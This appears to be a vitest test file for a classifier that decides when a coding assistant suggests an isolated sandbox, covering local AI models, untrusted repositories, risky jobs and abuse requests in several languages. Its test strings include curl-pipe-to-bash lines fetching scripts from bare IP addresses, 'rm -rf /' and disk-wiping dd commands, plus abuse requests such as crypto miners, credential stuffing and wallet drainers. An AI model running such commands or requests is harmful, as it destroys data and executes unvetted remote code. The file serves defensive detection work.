import { describe, expect, it } from "vitest";
import { classifyPrompt, threshold, type Category, type SessionContext } from "./index.ts";

const mac: SessionContext = { os: "macos", arch: "arm64" };

function offers(text: string, ctx: SessionContext = mac): boolean {
    return classifyPrompt(text, ctx).suggest;
}

function categoryOf(text: string, ctx: SessionContext = mac): Category | null {
    return classifyPrompt(text, ctx).category;
}

describe("heavy local AI", () => {
    it.each([
        "can you get chatterbox tts working on my laptop? want to make voice lines for my game",
        "install comfyui and grab the sdxl base checkpoint",
        "I want to try qwen 2.5 72b locally, what do I need",
        "run whisper on all the mp3s in ./interviews",
        "fine-tune llama 3.1 8b on my notes with unsloth",
        "set up InvokeAI locally so I can do some inpainting",
        "get piper tts running for my home assistant voice",
        "run llama.cpp with a 70b gguf on my 32gb mac",
        "install faster-whisper and transcribe the 3 hour lecture locally",
    ])("offers for %s", (text) => {
        expect(offers(text)).toBe(true);
        expect(categoryOf(text)).toBe("local_ai_model");
    });

    it("names the model as the subject", () => {
        expect(classifyPrompt("set up kokoro on my mac", mac).subject).toBe("kokoro");
    });

    it.each([
        "how does whisper work under the hood?",
        "write tests for the kokoro wrapper in src/tts.ts",
        "fix the bug in my ollama client",
        "update the README to mention that we use flux for image generation",
        "deploy the stable diffusion demo page to vercel",
        "what's the best local llm for coding on a 16gb mac?",
        "how much vram do i need for flux dev?",
        "compare ollama and lm studio",
        "write an article about voice cloning risks",
        "install a tts package for my app",
    ])("does not offer for %s", (text) => {
        expect(offers(text)).toBe(false);
    });

    it("needs an intent to run, a model name alone is not enough", () => {
        expect(offers("llama 3 70b")).toBe(false);
        expect(offers("run llama 3 70b")).toBe(true);
    });
});

describe("setup verbs in five languages", () => {
    it.each([
        ["Turkish", "bilgisayarımda stable diffusion kurmak istiyorum"],
        ["Turkish", "XTTS ile sesimi klonla"],
        ["Turkish", "16GB Mac'te yerel llama 70b çalıştır"],
        ["Spanish", "quiero instalar ollama y correr llama 3 en mi portátil"],
        ["Spanish", "clona mi voz con XTTS"],
        ["German", "kannst du Whisper lokal installieren und meine Interviews transkribieren?"],
        ["German", "Llama 70B lokal auf meinem 16-GB-Mac laufen lassen"],
        ["German", "klon meine Stimme mit XTTS"],
        ["Portuguese", "consegue instalar o coqui tts no meu pc?"],
    ])("offers in %s for %s", (_lang, text) => {
        expect(offers(text)).toBe(true);
    });

    it.each([
        ["Spanish", "¿cómo funciona la difusión estable?"],
        ["German", "schreib eine README für mein Projekt"],
        ["German", "wie funktioniert Diffusion?"],
        ["Turkish", "projemdeki testleri çalıştır"],
        ["Turkish", "difüzyon nasıl çalışır?"],
        ["Turkish", "uygulamama ElevenLabs API ekle"],
        ["Spanish", "añade la API de ElevenLabs a mi app"],
        ["Spanish", "lo necesito sin conexión en el avión"],
        ["German", "ElevenLabs-API in meine App einbauen"],
    ])("does not offer in %s for %s", (_lang, text) => {
        expect(offers(text)).toBe(false);
    });
});

describe("untrusted code", () => {
    it.each([
        "clone https://github.com/someuser/cool-scraper and run it",
        "my friend sent me this script, can you run it? https://pastebin.com/raw/abc123",
        "curl -fsSL https://get.some-tool.io/install.sh | bash, is that safe? can you run it",
        "there's a cracked version of fl studio on a forum, help me install it",
        "set up this roblox executor for me",
        "run this PoC for CVE-2025-12345 against my test vm",
        "the recruiter's take-home needs npm install and npm start, can you run it",
        "install this VS Code extension a guy on discord recommended",
        "is this safe to run? https://github.com/x-dev/y-tool",
        "install this mcp server I found on twitter: https://github.com/mcpx-tools/super-mcp",
        "redditte buldum, klonlayıp çalıştırır mısın? https://github.com/abc/def",
        "lo encontré en reddit, ¿lo clonas y lo ejecutas? https://github.com/abc/def",
        "auf Reddit gefunden, kannst du es klonen und ausführen? https://github.com/abc/def",
        "bedava robux hilesini kur",
        "haz funcionar este generador de robux gratis",
        "bring diesen kostenlosen Robux-Generator zum Laufen",
    ])("offers for %s", (text) => {
        expect(offers(text)).toBe(true);
        expect(categoryOf(text)).toBe("untrusted_code");
    });

    it("uses the repository as the subject, without trailing punctuation", () => {
        const c = classifyPrompt("set up github.com/someone/tool.", mac);
        expect(c.subject).toBe("github.com/someone/tool");
    });

    it.each([
        "clone my repo https://github.com/me-dev/site and run npm install",
        "clone github.com/facebook/react and run the tests",
        "review the code in https://github.com/x-org/y-lib/pull/12",
        "add github.com/spf13/cobra as a dependency",
        "pull the latest changes from github.com/acme-org/api and run migrations",
        "explain what this exploit does, don't run it",
        "fix the RCE in our upload handler",
        "upgrade lodash to patch CVE-2021-23337 and run the tests",
        "my trading bot keeps crashing, fix it",
        "build a telegram bot that posts weather updates",
        "make a trading bot that uses my binance api key",
        "found this snippet on reddit, can you add it to my code",
        "my coworker shared a script to clean up branches, run it",
        "open the report.pdf and summarize it",
        "unzip the dataset.zip into data/",
        "what is a reverse shell",
    ])("does not offer for %s", (text) => {
        expect(offers(text)).toBe(false);
    });

    it("needs an intent to run, a repo URL alone is not enough", () => {
        expect(offers("https://github.com/someone/tool")).toBe(false);
        expect(offers("try https://github.com/someone/tool")).toBe(true);
    });
});

describe("environment mismatch", () => {
    it.each<[string, SessionContext]>([
        ["this tool only works on linux and i'm on windows, can you run it for me", {}],
        ["my M3 mac can't run this CUDA-only training script, can you run it elsewhere?", mac],
        ["install the nvidia drivers and cuda toolkit on my ubuntu box", { os: "linux" }],
        ["this only runs on linux, can you build it and run the demo? I'm on a mac", {}],
        ["Torch not compiled with CUDA enabled on my M2, can you get this model running", mac],
    ])("offers for %s", (text, ctx) => {
        expect(offers(text, ctx)).toBe(true);
    });

    it.each([
        "install packages with apt in the Dockerfile",
        "install cuda toolkit in the github actions runner",
        "add CUDA support to my image processing library",
        "run the training script, it should use cuda if available",
        "explain the difference between cuda and mps",
        "set up a systemd service for my app",
        "the build fails on linux CI but works on my mac, can you fix it",
    ])("does not offer for %s", (text) => {
        expect(offers(text)).toBe(false);
    });

    it("only counts Linux-only tools away from Linux", () => {
        const text = "this tool only works on linux, can you run it";
        expect(offers(text, { os: "linux" })).toBe(false);
        expect(offers(text, { os: "windows" })).toBe(true);
    });
});

describe("risky experiments and heavy compute", () => {
    it.each([
        "test what happens if i run rm -rf / --no-preserve-root",
        "benchmark my disk with dd if=/dev/zero of=/dev/sdb",
        "render this blender scene overnight, my laptop overheats",
        "renderiza esta escena toda la noche, mi portátil se calienta",
        "über Nacht rendern, mein Laptop wird heiß",
        "gece boyunca render alsın, bilgisayarım ısınıyor",
        "run the fuzzer overnight, it'll take hours",
        "load test our api with 5000 concurrent users for an hour",
    ])("offers for %s", (text) => {
        expect(offers(text)).toBe(true);
    });

    it.each([
        "fix the fstab entry for /dev/sda1, then run mount -a",
        "debug the kernel panic in my driver",
        "this test takes 2 hours, can you make it faster?",
        "kick off the migration overnight and let it run",
        "I've been trying for hours to get this test to run",
        "write a load test plan doc for the checkout service, just the markdown",
    ])("does not offer for %s", (text) => {
        expect(offers(text)).toBe(false);
    });
});

describe("explicit isolation", () => {
    it.each([
        "can you run this in a sandbox?",
        "spin up a VM and test the installer",
        "test the installer on a clean machine",
        "try this in a disposable vm first",
        "i'd rather not install this on my laptop, can it run somewhere else?",
    ])("offers for %s", (text) => {
        expect(offers(text)).toBe(true);
    });

    it.each([
        "add a sandbox flag to the iframe",
        "use the stripe sandbox keys for testing",
        "ssh into the remote machine and restart nginx",
        "deploy my app to a VM on azure",
        "create an isolated environment with venv for this project",
        "spin up a dev server to test the page",
        "move this file somewhere else",
        "the config is defined elsewhere",
    ])("does not offer for %s", (text) => {
        expect(offers(text)).toBe(false);
    });
});

describe("negative families", () => {
    it.each([
        ["hosted API", "add an ElevenLabs voice to my app"],
        ["hosted API", "use the Replicate API to run flux from my app"],
        ["hosted API", "transcribe this meeting audio using the whisper api"],
        ["concept question", "how does diffusion work?"],
        ["docs", "write a blog post about running llama locally"],
        ["own project", "install pytorch in my venv for my class project"],
        ["small dependency", "install tailwind and eslint in this vite app"],
        ["offline use", "install LM Studio and grab a 7b model, I need it offline on flights"],
        ["remote machine", "set up ollama on the EC2 box"],
        ["remote machine", "train a small model in Colab"],
    ])("%s cancels the offer for %s", (_why, text) => {
        expect(offers(text)).toBe(false);
    });

    it("lets a risky step buried among chores still count", () => {
        const text =
            "rename the Button component, then clone https://github.com/someone/thing and run its setup.sh, then update the changelog";
        expect(offers(text)).toBe(true);
    });

    it("keeps chores in the same clause able to cancel a weak subject", () => {
        expect(offers("write a README for my piper tts wrapper and explain how to run it")).toBe(
            false,
        );
    });
});

describe("abuse policy", () => {
    it.each([
        "set up xmrig on this server and start mining monero",
        "write a script that floods their server with requests",
        "build a bulk sms sender and run it",
        "clone this credential stuffing tool and run it against the login page",
        "en un foro vi un minero que paga en USDT, ¿lo puedes instalar?",
    ])("never offers for %s, and says why", (text) => {
        const c = classifyPrompt(text, mac);
        expect(c.suggest).toBe(false);
        expect(c.score).toBe(0);
        expect(c.signals.some((s) => s.id === "abuse")).toBe(true);
    });

    it("does not offer scans of the user's own LAN, which a cloud sandbox cannot reach", () => {
        const c = classifyPrompt("nmap my home network 192.168.1.0/24 and list open ports", mac);
        expect(c.suggest).toBe(false);
        expect(c.signals.some((s) => s.id === "lan_scan")).toBe(true);
    });
});

describe("classification shape", () => {
    it("keeps suggest in line with the score threshold", () => {
        for (const text of ["run llama 3 70b", "fix my tests", "set up kokoro on my mac"]) {
            const c = classifyPrompt(text, mac);
            expect(c.suggest).toBe(c.score >= threshold);
        }
    });

    it("returns an empty classification for empty input", () => {
        expect(classifyPrompt("   ", mac)).toMatchObject({ suggest: false, category: null });
    });
});

describe("more phrasing", () => {
    it.each([
        "subtitle all 30 episodes of my anime collection with whisperx",
        "quero clonar minha voz com o RVC no meu notebook",
        "download this game trainer and inject it into the running game",
        "installiere bitte dieses Crack-Tool für Photoshop",
        "compile chromium from source, it takes forever on my machine",
        "ComfyUI'ı Flux ile kurup birkaç görsel üretebilir misin?",
        "necesito transcribir 200 horas de entrevistas con whisper en local",
    ])("offers for %s", (text) => {
        expect(offers(text)).toBe(true);
    });

    it.each([
        "what gpu would i need to run llama 70b?",
        "can you explain what this curl | bash line in our README does?",
        "write a crack detection model training script for our bridge photos dataset",
        "rename the airdrop component to rewards",
        "why is cuda not available in my docker container on the server",
        "ejecuta los tests de mi proyecto",
        "roda os testes do meu app",
    ])("does not offer for %s", (text) => {
        expect(offers(text)).toBe(false);
    });
});

describe("false offers from the review", () => {
    it.each([
        "someone on my team said our deploy script fails on node 22, can you run it and see?",
        "a client sent us a bug report, can you run the app and reproduce it?",
        "my friend said I should add dark mode to our app, can you build it?",
        "fetch the messages from the discord channel and run the bot locally",
        "I saw in a youtube video that swc speeds up the build, try it in our repo",
        "ejecuta el bot de discord y revisa los logs",
        "got a 502 on the staging server, run the healthcheck script again",
    ])("needs code handed over by a stranger before %s counts as unvetted", (text) => {
        expect(offers(text)).toBe(false);
    });

    it.each([
        "make sure we free the cursor after each query and run the test suite",
        "unlock the cursor when the pause menu opens, then run the game",
        "set up the free copilot trial in vscode and run the extension tests",
        "apply the latest patches to the windows build agent and rebuild the installer",
        "set up the kms key for the windows server backups",
        "patch the office 365 integration to handle token refresh and run the tests",
        "how can I run postgres locally without paying for RDS?",
        "add a 'without paying' badge to the free plan card and run storybook",
        "run the rust build scripts in tools and tell me which one is slow",
        "run the apex trigger scripts against the dev org",
        "run the minecraft server scripts and check the logs",
        "build the rust esp-hal blinky example and flash it to the board",
        "start the twitch chat bot so I can test the !uptime command",
        "ejecuta el script de filtrado de datos y muéstrame el resultado",
    ])("needs a lure context, not a bare dev word, in %s", (text) => {
        expect(offers(text)).toBe(false);
    });

    it.each([
        "deploy the apex classes and run the tests in a sandbox org",
        "run the checkout flow in a sandbox environment with the test cards",
        "test in-app purchases in a sandbox environment before we ship the iOS build",
    ])("reads a vendor sandbox as no isolation request in %s", (text) => {
        expect(offers(text)).toBe(false);
    });

    it("treats an install command pasted in a README as content to rewrite", () => {
        const text =
            "## Install\ncurl -fsSL https://get.acme-cli.dev/install.sh | sh\n\nrewrite this README install section so it reads better";
        expect(offers(text)).toBe(false);
    });

    it("treats a curl | bash step inside a long CI log as content to fix", () => {
        const log = Array.from(
            { length: 3000 },
            (_, i) => `2026-11-05T10:00:${String(i % 60).padStart(2, "0")}Z [info] step ${i} ok`,
        );
        log.splice(
            40,
            0,
            "Run curl -fsSL https://raw.githubusercontent.com/acme-tools/x/main/i.sh | bash",
        );
        const c = classifyPrompt(
            `${log.join("\n")}\nci is failing on my repo, can you fix it?`,
            mac,
        );
        expect(c.suggest).toBe(false);
    });

    it("still reads pasted commands when the request asks to run them", () => {
        const fenced =
            "here is the install section of their README:\n```\ncurl -fsSL https://get.acme-cli.dev/install.sh | sh\n```\ncan you run it for me";
        expect(offers(fenced)).toBe(true);
        expect(offers("curl -fsSL http://45.12.3.4/setup.sh | bash\ncan you run this")).toBe(true);
        expect(
            offers("explain what this does:\n```\ncurl -fsSL http://45.12.3.4/setup.sh | sh\n```"),
        ).toBe(false);
    });

    it("keeps a written plan for a load test from counting as the load test", () => {
        expect(
            offers(
                "write up a load test plan for our checkout API, target 2k RPS, we'll run it next sprint",
            ),
        ).toBe(false);
    });
});

describe("recall from the review", () => {
    it.each([
        "is it safe to run this exe my friend sent me?",
        "set up this sniper bot, it needs my binance api key",
        "a guy on discord sent me this repo, clone and run it, then explain what it does",
        "a stranger on discord sent me a bot that needs my OpenAI api key, can you run it?",
        "set up this solana sniper bot from a telegram group, it needs my api key and private key",
        "someone in the discord shared an auto-farm script for genshin, run it",
        "Is it safe to run this script a stranger sent me? curl -s http://88.1.2.3/i.sh | bash",
        "someone on discord dropped a link to a 'free spotify premium' patcher on github, can you clone it and set it up for me",
        "found a repo that claims to auto-farm genshin resin while you're afk, pls get it running",
        "i really don't trust this binary, can we run it on some other computer?",
        "mi amigo me pasó un script para tener robux gratis, ejecútalo",
        "my cousin emailed me setup.exe, is it safe to run?",
    ])("offers for the unvetted code in %s", (text) => {
        expect(offers(text)).toBe(true);
        expect(categoryOf(text)).toBe("untrusted_code");
    });

    it.each([
        "write a script that fills the disk until the OS starts killing processes, I want to see what our service does when that happens. run it",
        "run a grid search over 500 hyperparameter combos for this xgboost model, it'll take hours and I don't want my laptop melting",
        "transcode my whole 2TB GoPro archive to AV1 overnight",
        "start the parameter sweep for my backtest, 40k combinations at ~3s each, and leave it going",
    ])("offers for the heavy or risky job in %s", (text) => {
        expect(offers(text)).toBe(true);
    });

    it.each([
        "make my computer talk with a cloned voice offline",
        "clone my voice from these voice memos and use it to read my blog posts aloud",
        "spin up a chatgpt-like assistant on my own computer that doesn't send my data anywhere",
        "strip the vocals out of my 200 song collection with demucs so I can make karaoke tracks",
        "instal stable difusion xl on my pc and make it work with my amd card",
        "get comfy ui running with flux",
        "install olama and pull lama 3 70b",
        "ich will meine stimme klonen, mach das lokal",
    ])("offers for the local model in %s", (text) => {
        expect(offers(text)).toBe(true);
        expect(categoryOf(text)).toBe("local_ai_model");
    });

    it.each([
        "build a voice cloning feature for our app",
        "use the elevenlabs api to clone my voice",
        "add a chatgpt-like assistant to our app's sidebar",
        "build a chatgpt clone with next.js",
        "how does stable difusion work?",
        "fix the bug where my app strips the vocals metadata",
    ])("does not offer for %s", (text) => {
        expect(offers(text)).toBe(false);
    });
});

describe("everyday senses of words the rules look for", () => {
    it.each([
        ["Spanish deploy", "¿puedo desplegar el backend en la nube con kubernetes?"],
        ["German deploy", "Wie bringe ich meinen Server in der Cloud mit Terraform hoch?"],
        ["Portuguese deploy", "quero fazer deploy da api na nuvem usando docker"],
        ["Spanish remote server", "entra al servidor remoto y mira el uso de disco"],
        ["Turkish remote server", "uzak sunucudaki postgres loglarını incele"],
        ["Turkish payment sandbox", "iyzico kum havuzunda ödeme akışını çalıştır"],
        ["Spanish own VM", "en mi máquina virtual de Parallels no compila el proyecto"],
        ["Spanish bug location", "el fallo está en otro lado, revisa el servicio de login"],
        ["German bug location", "das Problem liegt woanders, schau in die Middleware"],
        ["Portuguese bug location", "o erro está em outro lugar, veja o serviço de pedidos"],
        ["Turkish bug location", "sorun başka bir yerde, servis katmanına bak"],
        ["English passive", "the helpers are already tested elsewhere, drop the duplicate specs"],
        ["English hosting", "the changelog is hosted elsewhere now, delete docs/changelog.md"],
        ["works in CI", "the build passes in CI but not on my laptop, here is the log"],
        ["works in docker", "it runs fine in docker but not on my mac, compare the env vars"],
        ["device testing", "the layout breaks on my phone, test it on another device as well"],
        ["product poc", "build a quick poc of the kanban board and run it"],
        ["product proof of concept", "let's build a proof of concept for the onboarding flow"],
        ["Spanish npm audit", "ejecuta npm audit y cuenta las vulnerabilidades"],
        ["German npm audit", "führe npm audit aus und liste die Schwachstellen"],
        ["Turkish npm audit", "npm audit çalıştır ve zafiyetleri say"],
        ["game glitch", "start the game and reproduce the ledge-skip exploit from the speedrun"],
        ["whisper feature", "build a whisper mode for the chat so users can send private notes"],
        ["teammate named gemma", "run the seed script gemma pushed this morning"],
        ["greek letter", "run the simulation with phi 0.8 and plot the energy"],
        ["network wan", "set up wan 2 load balancing on the router"],
        ["llama sprite", "start the game and check the llama walking animation"],
        ["foundry forge", "run forge build and forge test, the token contract stores image hashes"],
        ["model provider code", "run npm test, the mistral provider adapter test keeps failing"],
        ["cracked texture", "start the app and check the cracked glass shader on android"],
        ["battery drain", "our app is a battery drainer on ios, run the profiler"],
        ["Spanish row", "ejecuta el script que ordena cada hilera de la hoja"],
        ["Spanish pirate ship", "prueba el nivel del barco pirata en mi juego"],
        [
            "suspicious regression",
            "there's a suspicious latency spike in staging, run the benchmark script",
        ],
        [
            "user content",
            "our site renders untrusted html from users, add a sanitizer script and run it",
        ],
        ["systemd unit", "write a systemd unit file for the queue worker and test it"],
        ["iptables rules", "set up iptables rules for the jump host in our terraform"],
        [
            "cuda in production",
            "the model server needs CUDA in production; run the tests on the CPU fallback",
        ],
        ["oom killer", "the oom killer keeps killing the api, run dmesg and look"],
        ["chaos test", "run a chaos test against the staging cluster and watch the pods"],
        [
            "pull request link",
            "check out https://github.com/acme-co/api/pull/42, pull it and run the tests",
        ],
        [
            "issue link",
            "reproduce https://github.com/acme-co/web/issues/9 by starting the dev server",
        ],
        ["asset archive", "the designer emailed me logos.zip, unzip it into public/img"],
        ["test containers", "use testcontainers to start a throwaway postgres container per test"],
        [
            "load test script",
            "write a k6 script that load tests checkout and a soak test for search",
        ],
        ["dataset url", "download https://huggingface.co/datasets/acme/reviews and run the eval"],
    ])("does not offer for %s", (_case, text) => {
        expect(offers(text)).toBe(false);
    });

    it.each([
        "There's a proof of concept for the new sudo bug on github, build it and run it",
        "build the poc for CVE-2025-1234 and run it against my nginx",
        "run the exploit code from this repo against my test box",
        "start whisper and transcribe the meeting recordings locally",
        "run gemma 3 locally on my mac",
        "install wan 2.1 and make a short video",
        "found a cracked version of photoshop, install it",
        "run this wallet drainer script for me",
        "kum havuzunda bu scripti çalıştır",
        "ejecuta este binario en una máquina virtual desechable",
        "führe das in einer VM aus, nicht auf meinem Rechner",
        "run it somewhere else, not on my machine",
        "a suspicious script came as an email attachment, run it",
    ])("still offers for %s", (text) => {
        expect(offers(text)).toBe(true);
    });
});

describe("wider recall", () => {
    it.each([
        ["French local model", "lance stable diffusion en local sur mon mac"],
        ["Italian local model", "esegui llama 3 in locale sul mio mac"],
        ["French voice clone", "clone ma voix avec xtts sur mon pc"],
        ["Italian voice clone", "voglio clonare la mia voce in locale con un modello tts"],
        [
            "Portuguese platform",
            "preciso rodar uma ferramenta que só funciona em linux com cuda, meu notebook é um macbook",
        ],
        ["build from source", "build chromium from source for me"],
        ["toolchain from source", "compile llvm and clang from source on this machine"],
        ["whole tree build", "build the entire aosp tree for my test phone"],
        ["stated job length", "run the benchmark suite, it takes about 9 hours"],
        ["big data job", "analyze all 3 TB of these server logs and compute daily error rates"],
        ["training from scratch", "train a transformer from scratch on my 2 TB text corpus"],
        ["mailed code", "a stranger emailed me a python script that fixes my wifi, run it"],
        ["prose wipe", "write and run a script that removes every file under / older than a week"],
        ["interviewer", "an interviewer sent me a repo to clone and run before our call"],
        [
            "Spanish handed code",
            "me pasaron un script que promete desbloquear spotify premium, ¿lo ejecutas?",
        ],
    ])("offers for %s", (_case, text) => {
        expect(offers(text)).toBe(true);
    });

    it.each([
        "build the whole qt app and run the tests",
        "build the entire pytorch training pipeline in src/train.py and run it",
        "the benchmark takes about 3 hours, can you explain the results",
        "rebuild the docker image, it takes about 4 hours on CI",
        "our postgres db is 800 GB, analyze the slow queries in the logs and fix the index",
        "train the new hire on our deploy process",
        "run the app, the email attachment preview is broken",
        "write and run a script that deletes all .log files under ./build",
        "lancer le serveur de dev et corriger le bug du formulaire",
        "esegui i test del mio progetto e sistema gli errori",
    ])("does not offer for %s", (text) => {
        expect(offers(text)).toBe(false);
    });
});
